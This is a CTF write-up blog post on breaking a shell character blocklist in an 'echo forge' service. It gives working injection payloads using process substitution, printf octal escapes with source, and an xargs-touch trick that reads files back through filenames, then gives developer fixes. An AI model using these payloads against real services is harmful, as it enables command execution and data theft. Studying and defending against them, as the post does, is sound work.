---
slug: "nidavellir-shell-filter-bypass"
title: "Nidavellir: escaping a shell blocklist with printf and process substitution"
date: "2026-10-17"
category: "ctf"
tags:
  - "CTF"
  - "Shell"
  - "Command Injection"
  - "Linux"
  - "31 Nights of Cyber"
excerpt: "A 63-character echo service stripped the obvious metacharacters. The shell still had globbing, process substitution, and printf escape sequences."
---

![Nidavellir — a blocklist that forgot about the shell itself](/images/blog/nidavellir-shell-filter-bypass/hero.png)

The Echo Forge is a Python service that echoes whatever you type. It also blocks a list of characters, because it is "forging" commands and dwarves are apparently strict about runes.

Here is the entire attack surface:

```
Characters blocked:  space " $ & / ; | > ` {
Everything else:     letters, digits, * ? < ( ) ' \ # % = : , _ @ [ ] - . ~ } tab
Maximum length:      63 characters (60 accepted, 64 rejected)
```

That is a blocklist. The service is executing your input through a shell. I want you to notice how quickly those two facts combine into a problem.

## Finding the execution model

First, confirm the shell is real. Globbing:

```
*  ->  script.py
```

That is not an echo of `*`; that is the shell expanding it. Process substitution, which is the interesting one:

```
echo <(touch pwned)
```

The file `pwned` appeared. The outer command is `echo`. The process substitution ran `touch`. That means the service is executing a shell command line, not writing bytes to a socket.

The service source, leaked later, confirms it:

```python
self.send(shell.run(f"echo {cmd}"))
```

A persistent `subprocess.Popen` shell, with `; echo <uuid>` appended to know when a command finishes. The blocklist is applied to `cmd` before it reaches the shell. That is the classic mistake: **filtering a string, then handing it to an interpreter that has its own grammar.**

![The bypass, step by step](/images/blog/nidavellir-shell-filter-bypass/flow.png)

## Leaking the source with xargs

Before the bypass, a nice bit of lateral thinking: `xargs` turns whitespace-separated input into arguments. So:

```
<(xargs touch<script.py)
```

runs `xargs touch < script.py` inside process substitution, creating one filename per token in the source file. Then `*` lists them, and the source reconstructs itself from the filenames. No `cat`, no `>`, no spaces needed.

That is a genuinely useful primitive. `xargs` + globbing turns file *contents* into filenames, and filenames are readable through `*`. Exfiltration without a single blocked character.

## The core bypass

The insight is that `printf` interprets backslash escapes. So you can construct the blocked characters at runtime, after the filter has already run:

| Blocked character | `printf` escape |
|---|---|
| `/` | `\57` (octal) |
| `>` | `\76` (octal) |
| space | `\t` (tab is accepted and acts as whitespace) |
| newline / command separator | `\n` |

Then `source` executes the reconstructed script:

```sh
echo <(source <(printf 'COMMAND\n'))
```

The outer `echo` prints the process-substitution path; `source` runs the generated command. With tabs instead of spaces:

```
<(source	<(printf	'touch	proof\n'))
```

The file `proof` appeared. We have arbitrary command execution, 63 characters at a time.

## Reading the flag

The flag could be anywhere. Rather than guess one path, I copied candidate locations into numbered files:

```
<(source	<(printf	'cat	\57flag*\76f1\n'))
```

That becomes `cat /flag* >f1`. Repeat for `/app/flag*`, `/root/flag*`, `../flag*`, `flag*`, `/home/*/flag*`, `/tmp/flag*`, `/opt/flag*`, `/srv/flag*`, writing to `f1` … `f9`.

Then convert each captured file into filenames:

```
<(xargs	touch	<	f1)
```

And list:

```
*
```

The flag file contained `r00t{...}`, so `touch` created a file whose name was the flag itself. The listing revealed it:

```
r00t{wh15p3r5_0f_7h3_3ch0_4rg3_2b26a1c7}
```

"Whispers of the echo forge." The dwarves were not impressed.

## Why the blocklist failed

1. **The filter ran before the interpreter.** Any escape sequence, encoding, or expansion that the shell performs after validation is a bypass.
2. **Process substitution executes code even when the outer command is `echo`.** `echo` looks harmless. `<(...)` is not.
3. **`printf` reconstructs every blocked metacharacter.** A filter cannot block a character that the program can generate.
4. **`xargs touch` turns data into filenames.** That is a general exfiltration channel when globbing is available.
5. **The length limit was not a control.** Sixty characters is plenty for a shell command, and it can be chained across requests.

This is the same lesson as SQL injection and SSTI, just in a different language: **do not build command strings from user input**. If you must run a command, use `execve` with an argument vector and no shell. If you must accept text, use an allowlist — a strict pattern like `^[a-zA-Z0-9 _.-]{1,60}$` — and even then, do not pass it to a shell.

## What I would tell a developer

- If the service only needs to echo, use `print()` / `write()` and never invoke a shell.
- If you need to run a command, use `subprocess.run([...], shell=False)` with a fixed argument list.
- Disable globbing and process substitution if you are somehow stuck with a shell (`set -f`).
- Enforce an allowlist, not a blocklist. Blocklists are a list of the things you thought of.
- Run the service as an unprivileged user in a container with a read-only filesystem and no shell binary. Defence in depth, not a substitute for the fix.

## What I enjoyed about this one

It is the only challenge in the series where the exploit is a *language* problem rather than a library or protocol problem. There is no CVE to look up. You have to understand what the shell does with a string — expansion, substitution, redirection, quoting — and then find the gap between the filter's model of the input and the shell's model.

That gap is where most injection bugs live. The filter thinks in characters. The shell thinks in grammar. The attacker only needs the two models to disagree once.

## Further reading

- [Bash Reference Manual — process substitution](https://www.gnu.org/software/bash/manual/html_node/Process-Substitution.html)
- [Bash Reference Manual — `printf`](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [Python `subprocess` documentation](https://docs.python.org/3/library/subprocess.html)
- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [GTFOBins](https://gtfobins.github.io/) — for when you have execution but need to escalate

That is the standard set done. The second half of the series comes from **31 Nights of r00t**, where the challenges get meaner — decoy validators, ghost entries, and a lot of Windows event logs.
